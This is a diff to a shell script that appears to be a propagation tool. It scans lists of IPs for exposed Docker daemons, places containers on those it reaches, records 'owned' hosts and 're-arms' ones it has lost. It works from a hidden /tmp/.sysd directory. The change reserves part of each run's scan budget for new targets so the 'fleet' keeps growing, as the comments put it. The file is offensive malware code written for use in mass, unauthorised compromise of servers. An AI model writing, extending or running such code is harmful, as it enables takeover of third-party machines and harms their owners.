@@ -27,6 +27,7 @@ SYSDIR="${SYSDIR:-/tmp/.sysd}"
 # environment > worker.env > built-in default.
 E_MAX="${DOCK_MAX_HOSTS:-}"; E_PAR="${DOCK_PAR:-}"; E_SELF="${DOCK_SKIP_SELF:-}"
 E_REARM="${DOCK_REARM:-}"; E_RMAX="${DOCK_REARM_MAX:-}"; E_PORTS="${DOCK_PORTS:-}"
+E_FRES="${DOCK_FRESH_RESERVE:-}"
 [ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
 [ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
 WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
@@ -60,6 +61,14 @@ fi
 # and re-deploys what has vanished. Found, then lost, is still winnable.
 REARM="${E_REARM:-${DOCK_REARM:-yes}}"
 REARM_MAX="${E_RMAX:-${DOCK_REARM_MAX:-150}}"   # re-checks per run (rotates)
+# Both passes used to share one counter, and the re-arm list (everything we own + the
+# ledger head) is ~1.7x the per-run cap - so re-arm ate the whole budget and the *fresh*
+# queue was scanned zero times, run after run ("scanned 209 ... +0 new") while 5,000
+# unscanned candidates sat in mass.found. The fleet was frozen at what it had, not
+# growing. Reserve a slice of the cap for genuinely new hosts.
+FRESH_RES="${E_FRES:-${DOCK_FRESH_RESERVE:-40}}"   # % of MAX kept for the fresh pass
+REARM_CAP=$(( MAX * (100 - FRESH_RES) / 100 ))
+if [ "$REARM_CAP" -lt 1 ]; then REARM_CAP=1; fi
 SEEN="$WORK/dock.seen"            # daemon found here
 TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
 OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
@@ -314,8 +323,8 @@ owned_before=$(wc -l < "$OWNFILE")
 # pruned host unreachable forever.
 n=0
 walk() {
-    role=$1
-    echo "dock: pass $role, $(wc -l < "$LIST") row(s)"
+    role=$1; lim=$2; nr=0
+    echo "dock: pass $role, $(wc -l < "$LIST") row(s), cap $lim"
     while read -r ip; do
         [ -n "$ip" ] || continue
         if [ "$role" = fresh ]; then
@@ -329,8 +338,8 @@ walk() {
                 continue
             fi
         fi
-        n=$((n + 1))
-        if [ "$n" -gt "$MAX" ]; then echo "dock: cap $MAX reached, rest stays queued"; return 0; fi
+        n=$((n + 1)); nr=$((nr + 1))
+        if [ "$nr" -gt "$lim" ]; then echo "dock: $role cap $lim reached, rest stays queued"; return 0; fi
         dock_one "$ip" < /dev/null &
         # ^ /dev/null matters: a backgrounded dock_one otherwise inherits the
         #   walk's stdin (the candidate file) and eats lines out from under the
@@ -338,8 +347,9 @@ walk() {
         if [ $((n % PAR)) -eq 0 ]; then wait || true; fi
     done < "$LIST"
 }
-LIST="$REARM_LIST"; walk rearm
-LIST="$HOSTS";      walk fresh
+LIST="$REARM_LIST"; walk rearm "$REARM_CAP"
+LIST="$HOSTS";      walk fresh "$MAX"
+fresh_scanned=$nr
 wait || true
 rm -f "$HOSTS" "$REARM_LIST"
 sort -u "$OWNFILE" -o "$OWNFILE" 2>/dev/null || true
@@ -369,6 +379,6 @@ if [ "$REARM" = yes ]; then
     rm -f "$WORK/own.$$" "$WORK/lg.$$" "$WORK/lg2.$$" "$WORK/lg3.$$"
 fi
 owned_now=$(wc -l < "$OWNFILE")
-echo "dock: scanned $n, daemons known $(wc -l < "$SEEN"), placed $owned_now (+$((owned_now - owned_before)) new, $rearm_n re-verified)"
+echo "dock: scanned $n (fresh ${fresh_scanned:-0}), daemons known $(wc -l < "$SEEN"), placed $owned_now (+$((owned_now - owned_before)) new, $rearm_n re-verified)"
 echo "dock: re-arm ledger holds $(wc -l < "$LEDGER") known-but-lost host(s)"
 
